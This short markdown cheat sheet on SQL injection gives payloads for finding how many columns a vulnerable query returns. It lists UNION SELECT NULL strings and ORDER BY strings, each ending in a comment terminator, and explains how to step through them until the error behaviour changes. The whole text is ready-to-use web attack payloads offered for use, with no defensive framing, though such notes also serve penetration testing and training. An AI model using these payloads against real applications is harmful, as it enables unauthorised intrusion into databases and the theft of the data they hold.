# SQL Injection
**In the payloads here, I use "-- -", this is just to show that there's a space after the "--", don't put another "-" after the "-- "**

## Getting The Number of Columns of a Table

### With UNION:

```SQL
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL-- -
```
(Continue until you **don't** get an error which is caused by not having the right amount of columns)

### With ORDER BY:

```SQL
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
(Continue until you **do** get an error which is caused by there not being a column to order by (1st column, 2nd column, etc)
